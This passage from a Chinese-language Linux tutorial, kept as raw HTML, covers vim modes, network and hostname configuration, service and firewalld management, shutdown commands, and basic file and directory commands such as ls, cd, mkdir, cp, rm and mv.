Up</strong>&#x2F;<strong>Page Down</strong>，上&#x2F;下翻页</li><li><strong>Insert</strong>，切换光标为输入&#x2F;替换模式，光标将变成竖线&#x2F;下划线</li><li><strong>ESC</strong>，退出输入模式，切换到命令模式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%BC%96%E8%BE%91%E6%A8%A1%E5%BC%8F.png" alt="编辑模式"></p><h5 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h5><p>在命令模式下按下 **:**（英文冒号）就进入了底线命令模式。</p><p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p><ul><li><code>:w</code>：保存文件。</li><li><code>:q</code>：退出 Vim 编辑器。</li><li><code>:wq</code>：保存文件并退出 Vim 编辑器。</li><li><code>:q!</code>：强制退出Vim编辑器，不保存修改。</li><li><code>:set nu</code>:显示行号，设定之后，会在每一行的前缀显示该行的行号</li><li><code>:set nonu</code>:与 set nu 相反，为取消行号</li></ul><p>按 <strong>ESC</strong> 键可随时退出底线命令模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F.png" alt="命令行模式"></p><p>简单的说，我们可以将这三个模式想成底下的图标来表示：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgvim%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F.png" alt="vim的工作模式"></p><hr><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><h4 id="修改ip地址"><a href="#修改ip地址" class="headerlink" title="修改ip地址"></a>修改ip地址</h4><p>在kali Linux中使用<code>vim /etc/network/interfaces</code>进入interfaces中修改IP地址</p><p>在centOS中使用<code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code>修改IP地址</p><p>kali设置静态IP</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699531038969-692adcbc-8438-4457-9a6a-6ba84292e88f.png" alt="img"></p><p>kali设置动态IP（DHCP）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699531142939-55e570a6-648c-4128-b976-662b4854cda7.png" alt="img"></p><p>修改完成保存并退出，然后可执行 service network restart 重启网络，使网络生效，如果无法重启网络服务可通过执行 reboot 命令重启Kali虚拟机来使网络生效。再使用<code>ifconfig</code>查看当前网络配置。  </p><h4 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h4><p>使用<code>hostname</code>查询主机名，通过编辑<code>/etc/hostname </code>文件修改主机名,修改完重启后就生效了。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imghostname.png" alt="hostname"></p><p>通过<code>vim /etc/hosts</code>添加hosts映射，保存后，可以直接访问service，就可以访问到220.151 ip了。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699530229207-8ad31b1a-b134-4978-bff7-69f917a6a978.png" alt="9d294453e6544a649cd43dd254b0024c.png"></p><hr><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><p> service 服务管理 </p><p>Linux 中的进程和服务 计算机中，一个正在执行的程序或命令，被叫做“进程”（process）。 启动之后一只存在、常驻内存的进程，一般被称作“服务”（service）。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">service  服务名  start | <span class="hljs-type">stop</span> |<span class="hljs-type">· restart</span> | <span class="hljs-type">status</span><br></code></pre></td></tr></table></figure><p> 查看服务的方法：&#x2F;etc&#x2F;init.d&#x2F;服务名 ,发现只有两个服务保留在 service  .</p><p>chkconfig 设置后台服务的自启配置</p><p>1.基本语法</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699530352022-83c00fb8-634a-46cc-a711-249b19fc154d.png" alt="image.png"></p><p> 2.开启&#x2F;关闭 network(网络)服务的自动启动  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkconfig</span> network <span class="hljs-literal">on</span><br><br>chkconfig network <span class="hljs-literal">off</span><br></code></pre></td></tr></table></figure><p> 3.开启&#x2F;关闭 network 服务指定级别的自动启动  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkconfig</span> --level 指定级别 network <span class="hljs-literal">on</span><br></code></pre></td></tr></table></figure><p>systemctl</p><p>使用systemd代替init启动服务</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">systemctl  start | <span class="hljs-type">stop</span> | <span class="hljs-type">restart</span> | <span class="hljs-type">status</span> 服务名<br></code></pre></td></tr></table></figure><p>查看服务的方法：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system<br></code></pre></td></tr></table></figure><p><strong>systemctl 设置后台服务的自启配置</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span>  //查看所有服务开机启动状态<br><span class="hljs-string">systemctl</span> <span class="hljs-string">disable</span> <span class="hljs-string">service_name</span>  //关掉指定服务的自动启动 <br><span class="hljs-string">systemctl</span> <span class="hljs-string">enable</span> <span class="hljs-string">service_name</span>  //开启指定服务的自动启动 <br></code></pre></td></tr></table></figure><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>查看、更改防火墙状态</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl status firewalld  <span class="hljs-comment">#查看防火墙状态</span><br><br><span class="hljs-params">system</span>ctl stop firewalld <span class="hljs-comment"># 关闭防火墙</span><br><br><span class="hljs-params">system</span>ctl start firewalld <span class="hljs-comment"># 开启防火墙</span><br><br><span class="hljs-params">system</span>ctl enable firewalld.service  <span class="hljs-comment"># 开机自启动防火墙</span><br><br><span class="hljs-params">system</span>ctl disable firewalld.service <span class="hljs-comment"># 开机不自启动防火墙</span><br><br></code></pre></td></tr></table></figure><p>防火墙开放、删除端口  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">firewall-cmd --list-ports                #查询所有开放的端口<br><br>firewall-cmd <span class="hljs-attribute">--query-port</span>=8080/tcp       #查询端口是否开放<br><br>firewall-cmd <span class="hljs-attribute">--add-port</span>=8080/tcp --permanent          #永久添加8080端口<br>firewall-cmd <span class="hljs-attribute">--add-port</span>=65001-65010/tcp --permanent   #永久增加65001-65010端口<br><br>firewall-cmd <span class="hljs-attribute">--remove-port</span>=8800/tcp --permanent       #永久删除8080端口<br><br><span class="hljs-comment"># 对某个ip开放某个端口</span><br>firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=“rule <span class="hljs-attribute">family</span>=“ipv4” source <span class="hljs-attribute">address</span>=“192.168.142.166”<span class="hljs-built_in"> port </span><span class="hljs-attribute">port</span>=“5432” <span class="hljs-attribute">protocol</span>=“tcp” accept”<br><br><span class="hljs-comment"># 删除对某个ip开放某个端口</span><br>firewall-cmd --permanent <span class="hljs-attribute">--remove-rich-rule</span>=“rule <span class="hljs-attribute">family</span>=“ipv4” source <span class="hljs-attribute">address</span>=“192.168.142.166”<span class="hljs-built_in"> port </span><span class="hljs-attribute">port</span>=“5432” <span class="hljs-attribute">protocol</span>=“tcp” accept”<br></code></pre></td></tr></table></figure><p>命令解读  </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firwall-<span class="hljs-keyword">cmd</span><span class="language-bash">：是Linux提供的操作firewall的一个工具（服务）命令</span><br>--zone                                                                <span class="hljs-comment">#作用域</span><br>--<span class="hljs-keyword">add</span><span class="language-bash">-port=8080/tcp                                                   <span class="hljs-comment">#添加端口，格式为：端口/通讯协议 ；add表示添加，remove则对应移除</span></span><br>--permanent                                                           <span class="hljs-comment">#永久生效，没有此参数重启后失效</span><br><br></code></pre></td></tr></table></figure><p>更新防火墙规则，更改配置后要执行重载配置  </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">firewall-cmd <span class="hljs-comment">--reload</span><br></code></pre></td></tr></table></figure><h3 id="关机重启命令"><a href="#关机重启命令" class="headerlink" title="关机重启命令"></a>关机重启命令</h3><p>使用<code>sync</code><strong>将数据由内存同步到硬盘中</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">reboot  <span class="hljs-string">//</span>重启用户机<br><span class="hljs-keyword">shutdown</span> -r now  <span class="hljs-string">//</span>重启用户机<br><br><span class="hljs-comment"># 立马关机</span><br><span class="hljs-keyword">shutdown</span> -h now<br><br><span class="hljs-comment"># 计算机将在1分钟后关机，并且会显示在登录用户的当前屏幕中</span><br><span class="hljs-keyword">shutdown</span> -h 1 ‘This server will shut down after 1 mins‘<br><br><span class="hljs-comment"># 指定时间关机</span><br><span class="hljs-keyword">shutdown</span> 15<span class="hljs-function">:28</span><br><br><span class="hljs-comment"># 取消关机操作</span><br><span class="hljs-keyword">shutdown</span> -c<br></code></pre></td></tr></table></figure><h3 id="查看系统内核与版本"><a href="#查看系统内核与版本" class="headerlink" title="查看系统内核与版本"></a>查看系统内核与版本</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">uname -a  <span class="hljs-regexp">//</span>查看内核<span class="hljs-regexp">/操作系统/</span>CPU信息<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sudo su <span class="hljs-string">//</span>使用root用户，并输入密码<br>su kali <span class="hljs-string">//</span>在root用户下使用将用户切换为kali<br>sudo <span class="hljs-keyword">cd</span> <span class="hljs-string">/root</span> <span class="hljs-string">//</span>临时使用root用户查看root目录<br><span class="hljs-keyword">cd</span> /    <span class="hljs-string">//</span>跳转到根目录<br><span class="hljs-keyword">ls</span>   <span class="hljs-string">//</span>查看根目录下的所有文件<br>uname  <span class="hljs-params">(uname -v)</span>   <span class="hljs-string">//</span>查看当前版本<br>vi <span class="hljs-string">/etc/hostname</span>  <span class="hljs-string">//</span>进入hostname文件进行更改主机名字<br><span class="hljs-keyword">shutdown</span> -h + 时间  <span class="hljs-string">//</span>在设定的时间（分钟）后关机或是固定时间关机<br><span class="hljs-keyword">shutdown</span> -c   <span class="hljs-string">//</span>取消关机设置<br>reboot    <span class="hljs-string">//</span>重启<br>mkdir + 文件名  <span class="hljs-string">//</span>创建目录<br>rmdir + 文件名 <span class="hljs-string">//</span>删除空文件<br>touch + 文件名  <span class="hljs-string">//</span>创建空文件<br>cp 需要复制的文件地址 _ 复制到的文件地址  <span class="hljs-string">//</span>文件复制<br><br><br></code></pre></td></tr></table></figure><h1 id="Linux-文件与目录管理"><a href="#Linux-文件与目录管理" class="headerlink" title="Linux 文件与目录管理"></a>Linux 文件与目录管理</h1><p>我们知道 Linux 的目录结构为树状结构，最顶级的目录为根目录 **&#x2F;**。</p><p>其他目录通过挂载可以将它们添加到树中，通过解除挂载可以移除它们。</p><p>在开始本教程前我们需要先知道什么是绝对路径与相对路径。</p><ul><li><p><strong>绝对路径：</strong><br>路径的写法，由根目录 <strong>&#x2F;</strong> 写起，例如： &#x2F;usr&#x2F;share&#x2F;doc 这个目录。</p></li><li><p><strong>相对路径：</strong><br>路径的写法，不是由 <strong>&#x2F;</strong> 写起，例如由 &#x2F;usr&#x2F;share&#x2F;doc 要到 &#x2F;usr&#x2F;share&#x2F;man 底下时，可以写成： <strong>cd ..&#x2F;man</strong> 这就是相对路径的写法。</p></li></ul><hr><h2 id="处理目录的常用命令"><a href="#处理目录的常用命令" class="headerlink" title="处理目录的常用命令"></a>处理目录的常用命令</h2><p>接下来我们就来看几个常见的处理目录的命令吧：</p><ul><li><p>ls（英文全拼：list files）: 列出目录及文件名</p></li><li><p>cd（英文全拼：change directory）：切换目录</p></li><li><p>pwd（英文全拼：print work directory）：显示目前的目录</p></li><li><p>mkdir（英文全拼：make directory）：创建一个新的目录</p></li><li><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p></li><li><p>cp（英文全拼：copy file）: 复制文件或目录</p></li><li><p>rm（英文全拼：remove）: 删除文件或目录</p></li><li><p>mv（英文全拼：move file）: 移动文件与目录，或修改文件与目录的名称</p></li><li><p>touch：命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p><p> ls -l 可以显示档案的时间记录。</p></li></ul><p>你可以使用 <em>man [命令]</em> 来查看各个命令的使用文档，如 ：man cp。</p><h3 id="ls-列出目录"><a href="#ls-列出目录" class="headerlink" title="ls (列出目录)"></a>ls (列出目录)</h3><p>在Linux系统当中， ls 命令可能是最常被运行的。</p><p>语法：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> [-aAdfFhilnrRSt] 目录名称<br><span class="hljs-keyword">ls</span> [<span class="hljs-params">--color=</span>&#123;never,auto,always&#125;] 目录名称<br><span class="hljs-keyword">ls</span> [<span class="hljs-params">--full-time</span>] 目录名称<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li><li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li><li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li></ul><p>将目录下的所有文件列出来(含属性与隐藏档)</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@www</span> ~]<span class="hljs-meta"># ls -al ~</span><br></code></pre></td></tr></table></figure><h3 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd (切换目录)"></a>cd (切换目录)</h3><p>cd是Change Directory的缩写，这是用来变换工作目录的命令。</p><p>语法：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"> <span class="hljs-attribute">cd</span> [相对路径或绝对路径]<br><span class="hljs-comment">#使用 mkdir 命令创建 runoob 目录</span><br>[root<span class="hljs-variable">@www</span> ~]<span class="hljs-comment"># mkdir runoob</span><br><br><span class="hljs-comment">#使用绝对路径切换到 runoob 目录</span><br>[root<span class="hljs-variable">@www</span> ~]<span class="hljs-comment"># cd /root/runoob/</span><br><br><span class="hljs-comment">#使用相对路径切换到 runoob 目录</span><br>[root<span class="hljs-variable">@www</span> ~]<span class="hljs-comment"># cd ./runoob/</span><br><br><span class="hljs-comment"># 表示回到自己的家目录，亦即是 /root 这个目录</span><br>[root<span class="hljs-variable">@www</span> runoob]<span class="hljs-comment"># cd ~</span><br><br><span class="hljs-comment"># 表示去到目前的上一级目录，亦即是 /root 的上一级目录的意思；</span><br>[root<span class="hljs-variable">@www</span> ~]<span class="hljs-comment"># cd ..</span><br></code></pre></td></tr></table></figure><p>接下来大家多操作几次应该就可以很好的理解 cd 命令的。</p><h3 id="pwd-显示目前所在的目录"><a href="#pwd-显示目前所在的目录" class="headerlink" title="pwd (显示目前所在的目录)"></a>pwd (显示目前所在的目录)</h3><p>pwd 是 <strong>Print Working Directory</strong> 的缩写，也就是显示目前所在目录的命令。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@www</span> ~]<span class="hljs-meta"># pwd [-P]</span><br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li><strong>-P</strong> ：显示出确实的路径，而非使用链接 (link) 路径。</li></ul><p>实例：单纯显示出目前的工作目录：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"> pwd<br>/root   &lt;<span class="hljs-operator">=</span><span class="hljs-operator">=</span> 显示出目录啦～<br></code></pre></td></tr></table></figure><p>实例显示出实际的工作目录，而非链接档本身的目录名而已。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-built_in">cd</span> /var/mail   &lt;==注意，/var/mail是一个链接档<br> <span class="hljs-built_in">pwd</span><br>/var/mail         &lt;==列出目前的工作目录<br> <span class="hljs-built_in">pwd</span> -P<br>/var/spool/mail   &lt;==怎么回事？有没有加 -P 差很多～<br> <span class="hljs-built_in">ls</span> -ld /var/mail<br>lrwxrwxrwx 1 root root 10 Sep  4 17:54 /var/mail -&gt; spool/mail<br><span class="hljs-comment"># 看到这里应该知道为啥了吧？因为 /var/mail 是链接档，链接到 /var/spool/mail </span><br><span class="hljs-comment"># 所以，加上 pwd -P 的选项后，会不以链接档的数据显示，而是显示正确的完整路径啊！</span><br></code></pre></td></tr></table></figure><h3 id="mkdir-创建新目录"><a href="#mkdir-创建新目录" class="headerlink" title="mkdir (创建新目录)"></a>mkdir (创建新目录)</h3><p>如果想要创建新的目录的话，那么就使用mkdir (make directory)吧。</p><p>语法：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir [-mp] 目录名称<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</li><li>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</li></ul><p>实例：请到&#x2F;tmp底下尝试创建数个新目录看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span>    &lt;==创建一名为 <span class="hljs-built_in">test</span> 的新目录<br><span class="hljs-built_in">mkdir</span> test1/test2/test3/test4<br><span class="hljs-built_in">mkdir</span>: cannot create directory `test1/test2/test3/test4<span class="hljs-string">&#x27;: </span><br><span class="hljs-string">No such file or directory       &lt;== 没办法直接创建此目录啊！</span><br><span class="hljs-string">mkdir -p test1/test2/test3/test4</span><br></code></pre></td></tr></table></figure><p>加了这个 -p 的选项，可以自行帮你创建多层目录！</p><p>实例：创建权限为 <strong>rwx–x–x</strong> 的目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> -m <span class="hljs-number">711</span> test2<br><span class="hljs-attribute">ls</span> -l<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">50</span> test<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">53</span> test1<br><span class="hljs-attribute">drwx</span>--x--x  <span class="hljs-number">2</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">54</span> test2<br></code></pre></td></tr></table></figure><p>上面的权限部分，如果没有加上 -m 来强制配置属性，系统会使用默认属性。</p><p>如果我们使用 -m ，如上例我们给予 -m 711 来给予新的目录 drwx–x–x 的权限。</p><h3 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir (删除空的目录)"></a>rmdir (删除空的目录)</h3><p>语法：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">rmdir [-p] 目录名称<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li><strong>-p ：</strong>从该目录起，一次删除多级空目录</li></ul><p>删除 runoob 目录</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">rmdir runoob/<br></code></pre></td></tr></table></figure><p>将 mkdir 实例中创建的目录(&#x2F;tmp 底下)删除掉！</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ls</span> -l   &lt;==看看有多少目录存在？<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">50</span> test<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">53</span> test1<br><span class="hljs-attribute">drwx</span>--x--x  <span class="hljs-number">2</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">54</span> test2<br><span class="hljs-attribute">rmdir</span> test   &lt;==可直接删除掉，没问题<br><span class="hljs-attribute">rmdir</span> test1  &lt;==因为尚有内容，所以无法删除！<br><span class="hljs-attribute">rmdir</span>: `test1&#x27;: Directory not empty<br><span class="hljs-attribute">rmdir</span> -p test1/test2/test3/test4<br><span class="hljs-attribute">ls</span> -l        &lt;==您看看，底下的输出中test与test1不见了！<br><span class="hljs-attribute">drwx</span>--x--x  <span class="hljs-number">2</span> root  root <span class="hljs-number">4096</span> Jul <span class="hljs-number">18</span> <span class="hljs-number">12</span>:<span class="hljs-number">54</span> test2<br></code></pre></td></tr></table></figure><p>利用 -p 这个选项，立刻就可以将 test1&#x2F;test2&#x2F;test3&#x2F;test4 一次删除。</p><p>不过要注意的是，这个 rmdir 仅能删除空的目录，你可以使用 rm 命令来删除非空目录。</p><h3 id="cp-复制文件或目录"><a href="#cp-复制文件或目录" class="headerlink" title="cp (复制文件或目录)"></a>cp (复制文件或目录)</h3><p>cp 即拷贝文件和目录。</p><p>语法:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">cp <span class="hljs-selector-attr">[-adfilprsu]</span> 来源档(source) 目标档(destination)<br>cp <span class="hljs-selector-attr">[options]</span> source1 source2 source3 .... directory<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li><strong>-a：</strong>相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)</li><li><strong>-d：</strong>若来源档为链接档的属性(link file)，则复制链接档属性而非文件本身；</li><li><strong>-f：</strong>为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次；</li><li><strong>-i：</strong>若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)</li><li><strong>-l：</strong>进行硬式链接(hard link)的链接档创建，而非复制文件本身；</li><li><strong>-p：</strong>连同文件的属性一起复制过去，而非使用默认属性(备份常用)；</li><li><strong>-r：</strong>递归持续复制，用於目录的复制行为；(常用)</li><li><strong>-s：</strong>复制成为符号链接档 (symbolic link)，亦即『捷径』文件；</li><li><strong>-u：</strong>若 destination 比 source 旧才升级 destination ！</li></ul><p>用 root 身份，将 root 目录下的 .bashrc 复制到 &#x2F;tmp 下，并命名为 bashrc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/.bashrc /tmp/bashrc<br><span class="hljs-built_in">cp</span> -i ~/.bashrc /tmp/bashrc<br><span class="hljs-built_in">cp</span>: overwrite `/tmp/bashrc<span class="hljs-string">&#x27;? n  &lt;==n不覆盖，y为覆盖</span><br></code></pre></td></tr></table></figure><h3 id="rm-移除文件或目录"><a href="#rm-移除文件或目录" class="headerlink" title="rm (移除文件或目录)"></a>rm (移除文件或目录)</h3><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> [-fir] 文件或目录<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</li><li>-i ：互动模式，在删除前会询问使用者是否动作</li><li>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</li><li></li></ul><p>将刚刚在 cp 的实例中创建的 bashrc 删除掉！</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">rm</span> -i bashrc<br><span class="hljs-keyword">rm</span>: remove regular <span class="hljs-keyword">file</span> <span class="hljs-symbol">`bashrc&#x27;</span>? y<br></code></pre></td></tr></table></figure><p>如果加上 -i 的选项就会主动询问喔，避免你删除到错误的档名！</p><h3 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv (移动文件与目录，或修改名称)"></a>mv (移动文件与目录，或修改名称)</h3><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> [-fiu] <span class="hljs-built_in">source</span> destination<br><span class="hljs-built_in">mv</span> [options] source1 source2 source3 .... directory<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</li><li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li><li>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</li></ul><p>复制一文件，创建一目录，将文件移动到目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cp</span> ~/.bashrc bashrc<br><span class="hljs-built_in">mkdir</span> mvtest<br><span class="hljs-built_in">mv</span> bashrc mvtest<br></code></pre></td></tr></table></figure><p>将某个文件移动到某个目录去，就是这样做！</p><p>将刚刚的目录名称更名为 mvtest2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> mvtest mvtest2<br></code></pre></td></tr></table></figure><h3 id="touch（修改文件或者目录的时间属性。若文件不存在，系统会建立一个新的文件。）"><a 